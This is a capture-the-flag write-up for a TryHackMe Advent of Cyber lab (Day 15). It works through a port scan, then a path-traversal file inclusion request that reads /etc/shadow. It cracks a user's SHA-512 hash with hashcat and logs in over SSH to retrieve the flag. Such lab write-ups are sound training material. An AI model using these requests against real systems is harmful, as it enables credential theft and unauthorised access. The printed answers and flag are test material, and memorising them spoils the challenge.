# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 15
### References
* Spring, B. (2019, December 14). Local File Inclusion. TryHackMe Blog. https://blog.tryhackme.com/lfi/
## Reconnaissance
```bash
$ sudo nmap -sV -sC -vv 10.10.129.142
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9a:03:45:f5:5d:44:d3:18:82:6b:e7:4a:bd:30:ad:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJZRhGza0LfrMtyxnABnZY4ZUVbKfUb4HZO5rJTeR9tzCn0rFswbrQC1MtvB1Imi55zx3LPjc1WBRhpJ3IGdkdcAEfO1UTzCSkaI+gVa4J+/oFmhSg3xchG8/qE1QufncW9LnEKpUP9EM/CxSvCRpLbDAtVQdTjhYfJMK78ixiYHhAsrbw1crkhZyvYBo19y61EDoiL8ZNTkgFx4SrqlJIfcsAxLgat9a8Bf2jXacbuqv0R7vM3sVEQvgrEK7SqwSKgcxutVOs2gkPgsKL6vMtsytYCMdDnibVViEioli8KgBTkYjqKTXkzaGbeno2w0yDJbt6syJjOexzl7j96TMj
|   256 1e:b5:f5:d0:8b:da:82:3c:f8:aa:04:83:90:0a:5d:c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJdNinV/k0bYfSVBBs1LZX3L9iYv/axqqX+M/AW20YrY7jl5oMA8g3QiSzsL021jURX5d7FIoIg/TrGvBZtjQdQ=
|   256 64:5c:b2:04:60:af:63:e7:52:7b:f5:e3:30:05:7e:11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDSuT1x7x4fxAHZjoBkQ9LBWvL6HkoL9LZY/iAc7RRCd
80/tcp open  http    syn-ack ttl 61 Node.js (Express middleware)
|_http-favicon: Unknown favicon MD5: DBC69DB56435575CDC5CF45C96045958
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Public Notes
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## What is Charlie going to book a holiday to?
* From the website's homepage:
> ### Note 3
> #### To do list:
> * Take Santa sleigh in for an MOT
> * Improve security on file inclusion
> * Go food shopping
> * Book holiday to Hawaii

**Answer**: `Hawaii`
## Read `/etc/shadow` and crack Charlie's password.
1. With Burpsuit, proxy the website and look for a request to the `/notes/note1.txt` file (file system path `/` are encoded to `%2f` in URLs):
```http
GET /get-file/views%2fnotes%2fnote1.txt HTTP/1.1
Host: 10.10.210.111
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://10.10.210.111/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```
2. Modify the request path to point to `/etc/shadow`:
```http
GET /get-file/%2fetc%2fshadow HTTP/1.1
Host: 10.10.210.111
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://10.10.210.111/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```
3. `/etc/shadow`'s contents will be rendered on the webpage:
```
root:*:18152:0:99999:7:::
daemon:*:18152:0:99999:7:::
bin:*:18152:0:99999:7:::
sys:*:18152:0:99999:7:::
sync:*:18152:0:99999:7:::
games:*:18152:0:99999:7:::
man:*:18152:0:99999:7:::
lp:*:18152:0:99999:7:::
mail:*:18152:0:99999:7:::
news:*:18152:0:99999:7:::
uucp:*:18152:0:99999:7:::
proxy:*:18152:0:99999:7:::
www-data:*:18152:0:99999:7:::
backup:*:18152:0:99999:7:::
list:*:18152:0:99999:7:::
irc:*:18152:0:99999:7:::
gnats:*:18152:0:99999:7:::
nobody:*:18152:0:99999:7:::
systemd-timesync:*:18152:0:99999:7:::
systemd-network:*:18152:0:99999:7:::
systemd-resolve:*:18152:0:99999:7:::
systemd-bus-proxy:*:18152:0:99999:7:::
syslog:*:18152:0:99999:7:::
_apt:*:18152:0:99999:7:::
lxd:*:18152:0:99999:7:::
messagebus:*:18152:0:99999:7:::
uuidd:*:18152:0:99999:7:::
dnsmasq:*:18152:0:99999:7:::
sshd:*:18152:0:99999:7:::
pollinate:*:18152:0:99999:7:::
ubuntu:!:18243:0:99999:7:::
charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::
```
4. Use `hashcat` to crack Charlie's password:
```bash
$ hashcat -a 0 -m 1800 '$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.' rockyou.txt
$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:password1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0K...GOyhL.
Time.Started.....: Wed Jun 30 12:00:11 2021 (3 secs)
Time.Estimated...: Wed Jun 30 12:00:14 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:     1098 H/s (7.32ms) @ Accel:8 Loops:16 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3072/14344384 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#2....: 123456 -> dangerous
```

**Answer**: `password1`
## What is `flag1.txt`?
* Connect to Charlie's server with SSH using the previously found credentials:
```bash
$ ssh charlie@10.10.210.111
charlie@10.10.210.111's password: password1
charlie@ip-10-10-210-111:~$ ls
flag1.txt
charlie@ip-10-10-210-111:~$ cat flag1.txt 
THM{4ea2adf842713ad3ce0c1f05ef12256d}
```
**Flag**: `THM{4ea2adf842713ad3ce0c1f05ef12256d}`